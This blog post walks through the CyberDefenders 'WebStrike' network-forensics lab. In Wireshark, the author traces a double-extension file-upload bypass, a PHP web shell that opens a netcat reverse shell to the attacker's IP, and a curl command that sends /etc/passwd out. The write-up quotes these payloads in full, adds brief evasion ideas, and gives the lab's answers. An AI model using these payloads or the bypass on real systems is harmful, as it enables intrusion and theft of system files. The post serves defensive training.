---
layout: post
title: "CyberDefenders Lab: WebStrike"
date: 2025-07-26
categories: ["CyberDefenders", "Practice", "SOC Analyst Tier 1", "Level 1"]
tags:
  - "CyberDefenders"
  - "Network Forensics"
  - "Initial Access"
  - "Execution"
  - "Persistence"
  - "Command and Control"
  - "Exfiltration"
  - "Wireshark"
---

# CyberDefenders Lab: WebStrike

# Table of Contents

- [Overview / Goal](#overview--goal)
- [Lab Setup and Tools Used](#lab-setup-and-tools-used)
  - [Q1: Attack Origin](#q1-attack-origin)
  - [Q2: Attacker User-Agent](#q2-attacker-user-agent)
  - [Q3: Malicious File Uploaded](#q3-malicious-file-uploaded)
  - [Q4: Upload Directory Exposed](#q4-upload-directory-exposed)
  - [Q5: Reverse Shell Target Port](#q5-reverse-shell-target-port)
  - [Q6: File Exfiltrated](#q6-file-exfiltrated)
- [What I'd Do Next (Blue Team)](#what-id-do-next)
- [Refining the Attack (Red Team)](#refining-the-attack)
- [Try This Lab Yourself](#try-this-lab-yourself)

# Overview / Goal

This was my first time using **CyberDefenders.org**. I've had some experience on HackTheBox before, so I was tiny bit confident going in. The scenario sounded straightforward:

> A suspicious file was identified on a company web server, raising alarms within the intranet. The Development team flagged the anomaly, suspecting potential malicious activity. To address the issue, the network team captured critical network traffic and prepared a PCAP file for review.
>
> Your task is to analyze the provided PCAP file to uncover how the file appeared and determine the extent of any unauthorised activity.

# Lab Setup and Tools Used

After waiting for the lab to load, I hit the **Open** button and saw a desktop with a folder called "Start here". Inside, two folders:

- "Artifacts" -> had the "WebStrike.pcap"
- "Tools" -> Wireshark and other tools

I went with Wireshark cause I had previous experience with it.

---

## Q1: Attack Origin {#q1-attack-origin}

**Approach:** My thought process was:

1. I need to identify the suspicious connection
2. Get the attacker's IP address
3. Use one of the million tools online to Geolocate it.

So, I started by:

1. Opened `WebStrike.pcap` in Wireshark and saw the Packet List pane full of useful information!
2. I looked for odd ports (4444, 22, 3389) and POST traffic suggesting file uploads. I started with filtering with `http`
3. Spotted a **POST** request early in the capture - No.53. Interesting...

I followed the HTTP stream and got this:

![Wireshark stream: POST request to upload "image.php" rejected due to invalid file format.](https://github.com/ce-omarbadawy/ce-omarbadawy/blob/main/assets/images/attachments/2025-07-26-webstrike-lab-attachments/webstrike-lab-wireshark-stream-failed-attempt.webp?raw=true)

Nice. A failed upload, but it gave some info: the attacker tried to upload image.php.

I pulled the source IP from that stream: 117.11.88.124
Pasted it into an IP Geolocation tool outside the lab.

**Answer:** Tianjin, China ✅

---

## Q2: Attacker User-Agent {#q2-attacker-user-agent}

Already had it from above:
**Answer:** User-Agent ✅

```plaintext
Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
```

---

## Q3: Malicious File Uploaded{#q3-malicious-file-uploaded}

**Approach:** Using the exact approach of Q1. shows the payload in that HTTP POST.

Filename: `image.php`
Server said: **"Invalid file format."**

Attacker started thinking... Next POST, they renamed it to:

```sql
filename="image.jpg.php"
```

Server responded:

> "File uploaded successfully."

That name passed the weak validation.

**Why did it worked?**

The server checks if the filename ends in .jpg , .png , .jpeg , etc. The attacker abused this by renaming the file. Some bad MIME filter or regex for example:

```php
if (preg_match('/\.(jpg|jpeg|png)$/', $filename))
```

`image.jpg.php` works because `.jpg` comes first. Server thinks it's safe, and saves it as-is.

If the web server executes `.php` anywhere (including `/uploads/`), it's game over.

Attacker just hits:

```plaintext
http://shoporoma.com/reviews/uploads/image.jpg.php
```

This trick is **file extension double-dot bypass**. It works when:

- Server checks **first extension** only
- Server lets `.php` be executed even in `/uploads/`
- No actual MIME type validation is done (like checking file content headers)

**Web shell active.**

Here's the malicious payload uploaded:

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>
```

### What it does

- `rm /tmp/f;`
  - Removes any old named pipe called `f` if it exists in `/tmp`
- `mkfifo /tmp/f;`
  - Creates a **named pipe** (FIFO) acts like a virtual file for command input/output
- `cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f`
  - This is the core: it creates a loop between `sh` and the attacker's netcat listener.

Let's unwrap what it does:

1. `cat /tmp/f`
   -> Reads input sent by attacker into the pipe
2. `/bin/sh -i`  
   -> Sends that to `/bin/sh` in interactive mode
3. `2>&1`  
   -> Redirects STDERR to STDOUT (so you get full output back)
4. `nc 117.11.88.124 8080`  
   -> Pipes the shell's output to netcat, which connects to the attacker's machine
5. `>/tmp/f`  
   -> Sends the attacker's responses back into the named pipe

> This was a mkfifo-based reverse shell, but others (bash, python, perl, etc.) can be done in similar ways.

**Answer:** `image.jpg.php` ✅

---

## Q4: Upload Directory Exposed{#q4-upload-directory-exposed}

**Approach:** Here we are looking for the **web-accessible path** (the URL directory), not the literal `/var/www/html/` backend path. I filtered with:

```sql
http.request.method == "GET"
```

Found this request:

```http
GET /reviews/uploads/image.jpg.php HTTP/1.1
```

**Answer:** `/reviews/uploads/` ✅

---

## Q5: Reverse Shell Target Port{#q5-reverse-shell-target-port}

It's in the payload we just saw in Q3:

```bash
nc 117.11.88.124 8080
```

**Answer:** 8080 ✅

---

## Q6: File Exfiltrated{#q6-file-exfiltrated-}

**Approach:** I'm thinking, I'm trying to find a **GET**, **POST**, or **reverse shell command** where the attacker tried to `cat`, `scp`, `nc`, or `curl` a sensitive file. Time to follow the shell session. I filtered by:

```sql
ip.addr == 117.11.88.124 && tcp.port == 8080
```

Then followed the TCP stream.

> SIDE NOTE: It's also possible for the attack to be done over HTTP which is rare but in that case I would've used the filter `http.request`

Inside that reverse shell session, attacker executes:

```bash
curl -X POST -d /etc/passwd http://117.11.88.124:443/
```

**Answer:** `passwd` ✅

---

# What I'd Do Next (Blue Team) {#what-id-do-next}

- Never trust user-provided filename. I'd add MIME type verification and content inspection.
- Disable script execution in ANY directory meant for user uploads.
- Setup alerts for spawning shells or using tools like nc or curl.

# Refining the Attack (Red Team) {#refining-the-attack}

- I would attempt to use a Fileless Reverse Shell directly in memory instead of mkfifo to make forensic recovery harder.
- Obfuscate the payload to try to hide `system()` calls from basic scanners

# Try This Lab Yourself

🔗 Lab Link: [CyberDefenders: WebStrike](https://cyberdefenders.org/blueteam-ctf-challenges/webstrike/)
